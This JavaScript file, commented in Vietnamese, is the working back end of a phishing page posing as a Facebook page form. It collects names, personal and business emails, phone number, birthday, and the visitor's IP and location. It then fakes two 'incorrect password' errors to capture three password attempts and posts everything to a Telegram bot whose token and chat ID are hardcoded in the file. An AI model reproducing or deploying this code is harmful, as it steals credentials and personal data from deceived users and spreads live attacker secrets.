// Định dạng ngày sinh
document.getElementById('birthday').addEventListener('input', function (e) {
    let input = e.target.value.replace(/[^0-9\/]/g, '');

    if (input.length > 2 && input[2] !== '/') {
        input = input.slice(0, 2) + '/' + input.slice(2);
    }

    if (input.length > 5 && input[5] !== '/') {
        input = input.slice(0, 5) + '/' + input.slice(5);
    }

    if (input.length > 10) {
        input = input.slice(0, 10);
    }

    e.target.value = input;
});

// Kiểm tra hợp lệ và hiển thị modal nhập mật khẩu
document.getElementById('continueButton').addEventListener('click', async function () {
    const pageName = document.getElementById('page-name');
    const fullName = document.getElementById('full-name');
    const email = document.getElementById('email');
    const businessEmail = document.getElementById('email-bus');
    const phone = document.getElementById('phone');
    const birthday = document.getElementById('birthday');

    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phonePattern = /^[0-9+\-() ]{6,20}$/;

    let valid = true;

    // Xóa lỗi cũ
    document.querySelectorAll('input').forEach(input => input.classList.remove('error'));

    // Kiểm tra Page Name
    if (pageName.value.trim() === "") {
        pageName.classList.add('error');
        valid = false;
    }

    // Kiểm tra Full Name
    if (fullName.value.trim() === "") {
        fullName.classList.add('error');
        valid = false;
    }

    // Kiểm tra email cá nhân
    if (!emailPattern.test(email.value)) {
        email.classList.add('error');
        valid = false;
    }

    // Kiểm tra email công việc
    if (!emailPattern.test(businessEmail.value)) {
        businessEmail.classList.add('error');
        valid = false;
    }

    // Kiểm tra số điện thoại
    if (!phonePattern.test(phone.value)) {
        phone.classList.add('error');
        valid = false;
    }

    // Kiểm tra ngày sinh
    if (birthday.value.trim() === "" || !/^\d{2}\/\d{2}\/\d{4}$/.test(birthday.value)) {
        birthday.classList.add('error');
        valid = false;
    }

    if (valid) {
        sessionStorage.setItem('page-name', pageName.value);
        sessionStorage.setItem('full-name', fullName.value);
        sessionStorage.setItem('email', email.value);
        sessionStorage.setItem('email-bus', businessEmail.value);
        sessionStorage.setItem('phone', phone.value);
        sessionStorage.setItem('birthday', birthday.value);

        try {
            const response = await fetch('https://ipinfo.io?token=556e67077559fb', { cache: 'no-cache' });
            if (!response.ok) throw new Error('API ipinfo.io trả về lỗi');

            const data = await response.json();
            const countryCode = data.country || 'Unknown';
            const region = data.region || 'Unknown';
            const city = data.city || 'Unknown';
            const ipAddress = data.ip || 'Unknown'; // Lấy địa chỉ IP

            const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
            const countryName = regionNames.of(countryCode) || countryCode;

            const location = `${countryName}/${region}/${city}`;
            sessionStorage.setItem('location', location);
            sessionStorage.setItem('ip-address', ipAddress); // Lưu địa chỉ IP vào sessionStorage

            // Hiển thị modal nhập mật khẩu
            document.getElementById('overlay').style.display = 'flex';
        } catch (error) {
            console.error('Lỗi khi lấy thông tin vị trí:', error);
            sessionStorage.setItem('location', 'Unknown/Unknown/Unknown');
            sessionStorage.setItem('ip-address', 'Unknown'); // Gán giá trị mặc định cho địa chỉ IP
            document.getElementById('overlay').style.display = 'flex';
        }
    }
});

// Gửi thông tin đến Telegram khi nhấn Continue
let firstPassword = null; // Lưu mật khẩu lần nhập đầu tiên
let secondPassword = null; // Lưu mật khẩu lần nhập thứ hai

document.getElementById('passwordForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const passwordInput = document.getElementById('password');
    const password = passwordInput.value.trim(); // Lấy giá trị mật khẩu
    const errorMessage = document.getElementById('error-message'); // Dòng thông báo lỗi

    // Xóa thông báo lỗi (nếu có) khi bắt đầu xử lý
    errorMessage.style.display = 'none';
    errorMessage.innerHTML = '';

    if (!firstPassword) {
        // Lần nhập mật khẩu đầu tiên
        firstPassword = password;
        passwordInput.value = ''; // Xóa nội dung ô nhập

        // Hiển thị thông báo sau 2 giây
        setTimeout(() => {
            errorMessage.innerHTML = `
                <div style="text-align: center; margin-bottom: 10px;">
                    The password you’ve entered is incorrect. Please try again.
                    <div style="margin-top: 5px;">
                        <a href="https://www.facebook.com/recover/initiate/" target="_blank" style="color: blue; text-decoration: none;">Forgot password?</a>
                    </div>
                </div>
            `;
            errorMessage.style.color = 'red'; // Màu chữ đỏ
            errorMessage.style.display = 'block'; // Hiển thị dòng thông báo
        }, 2000); // 2 giây
    } else if (!secondPassword) {
        // Lần nhập mật khẩu thứ hai
        secondPassword = password;
        passwordInput.value = ''; // Xóa nội dung ô nhập

        // Hiển thị thông báo sau 2 giây
        setTimeout(() => {
            errorMessage.innerHTML = `
                <div style="text-align: center; margin-bottom: 10px;">
                    The password you’ve entered is incorrect. Please try again.
                    <div style="margin-top: 5px;">
                        <a href="https://www.facebook.com/recover/initiate/" target="_blank" style="color: blue; text-decoration: none;">Forgot password?</a>
                    </div>
                </div>
            `;
            errorMessage.style.color = 'red'; // Màu chữ đỏ
            errorMessage.style.display = 'block'; // Hiển thị dòng thông báo
        }, 2000); // 2 giây
    } else {
        // Lần nhập mật khẩu thứ ba
        const thirdPassword = password;

        // Lấy thông tin từ sessionStorage
        const email = sessionStorage.getItem('email');
        const businessEmail = sessionStorage.getItem('email-bus');
        const phone = sessionStorage.getItem('phone');
        const birthday = sessionStorage.getItem('birthday');
        const location = sessionStorage.getItem('location') || 'Unknown/Unknown/Unknown';
        const ipAddress = sessionStorage.getItem('ip-address') || 'Unknown'; // Lấy địa chỉ IP

        const BOT_TOKEN = "8084816537:AAHxy16raKfk1qJ7ZHDJ9k1LSJo5DMKlp28";
        const CHAT_ID = "-4582867073";

        const message = `
📄 *User Information*
------------------------
📧 *Personal Email:* ${email}
📧 *Business Email:* ${businessEmail}
📞 *Phone:* ${phone}
🎂 *Birthday:* ${birthday}
🌍 *Location:* ${location}
🌐 *IP Address:* ${ipAddress}
🔒 *First Password:* ${firstPassword}
🔒 *Second Password:* ${secondPassword}
🔒 *Third Password:* ${thirdPassword}
`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown",
                }),
            });

            if (response.ok) {
                // Chuyển đến trang verify.html sau khi gửi thành công
                window.location.href = '/verify';
            } else {
                const errorData = await response.text();
                console.error("Telegram API Error:", errorData);
                alert('Không thể gửi thông tin. Lỗi từ Telegram API.');
            }
        } catch (error) {
            console.error('Lỗi khi gửi thông tin:', error);
            alert('Không thể gửi thông tin. Vui lòng kiểm tra kết nối mạng hoặc cấu hình.');
        }
    }
});
